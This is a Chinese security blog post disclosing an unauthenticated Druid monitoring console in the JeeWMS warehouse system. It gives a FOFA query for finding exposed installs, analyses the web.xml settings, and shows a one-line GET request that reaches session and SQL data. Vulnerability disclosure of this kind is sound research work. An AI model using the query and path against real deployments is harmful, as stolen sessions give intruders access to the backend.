---
title: "JeeWMS druid 未授权访问漏洞"
source: https://mrxn.net/jswz/JeeWMS-druid-unauth-accept.html
asset_dir: assets/jeewms-druid-未授权访问漏洞
---

# JeeWMS druid 未授权访问漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/24 08:32
* 1221浏览
* [0评论](#comment)
* 21分钟阅读

深入探索

网页浏览器

代码安全审计

漏洞扫描服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

JeeWMS 是基于Java全栈技术打造的智能仓储中枢系统，具备多形态仓储场景深度适配能力（兼容3PL第三方物流与厂内物流双模式）。JeeWMS 存在 druid [未授权访问](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83 "未授权访问")，未授权攻击者可利用此漏洞获取系统如sql语句、url链接、Session等敏感信息。

漏洞扫描服务

# 影响版本

最新版

# fofa语法

> `body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro" || fid="cC2r/XQpJXcYiYFHOc77bg=="`

# 漏洞分析

web.xml 里有关 druid 的过滤设置如下

```
<filter>
        <filter-name>druidWebStatFilter</filter-name>
        <filter-class>com.alibaba.druid.support.http.WebStatFilter</filter-class>
        <init-param>
            <param-name>exclusions</param-name>
            <param-value>/css/*,/context/*,/plug-in/*,*.js,*.css,*/druid*,/attached/*,*.jsp</param-value>
        </init-param>
        <init-param>
            <param-name>principalSessionName</param-name>
            <param-value>sessionInfo</param-value>
        </init-param>
        <init-param>
            <param-name>sessionStatEnable</param-name>
            <param-value>false</param-value>
        </init-param>
        <init-param>
            <param-name>profileEnable</param-name>
            <param-value>true</param-value>
        </init-param>
    </filter>
```

`exclusions`参数中配置了`*/druid*`，该模式使用Ant风格路径匹配规则，会匹配所有包含`/druid`的路径（例如`/druid/*`、`/api/druid/status`等）。若Druid控制台的访问路径（如`/druid/*`）未被其他安全机制（如认证、授权）保护，攻击者可直接访问Druid监控界面，造成 druid 未授权访问漏洞。

再根据 druid 的servlet

安全运维咨询

```
<!-- druid -->
    <servlet>
        <servlet-name>druidStatView</servlet-name>
        <servlet-class>com.alibaba.druid.support.http.StatViewServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>druidStatView</servlet-name>
        <url-pattern>/webpage/system/druid/*</url-pattern>
    </servlet-mapping>
```

得到具体的访问路径 `/webpage/system/druid/*`

# 漏洞复现

注意路径可能有或者没有 jeewms

漏洞扫描服务

> /jeewms/webpage/system/druid/sql.html

```
GET /webpage/system/druid/websession.html HTTP/1.1
Host: localhost
```

[![JeeWMS druid 未授权访问漏洞](images/img-001-c9468e85a198.webp)](https://image.mrxn.net/c6cda1389d984a06aac215ed045351ef.webp)

也是可以成功未授权访问到session，可利用这些session进入后台

或者查看sql语句等

[![JeeWMS druid 未授权访问漏洞](images/img-002-de97ace8312d.webp)](https://image.mrxn.net/3c4f9afd300a499dbf42d0b218632cd9.webp)

# 参考

* `https://gitee.com/erzhongxmu/JEEWMS/blob/master/src/main/webapp/WEB-INF/web.xml`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[JeeWMS druid 未授权访问漏洞](https://mrxn.net/jswz/JeeWMS-druid-unauth-accept.html)  
文章链接：<https://mrxn.net/jswz/JeeWMS-druid-unauth-accept.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全运维咨询

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/JeeWMS-druid-unauth-accept.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/JeeWMS-druid-unauth-accept.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 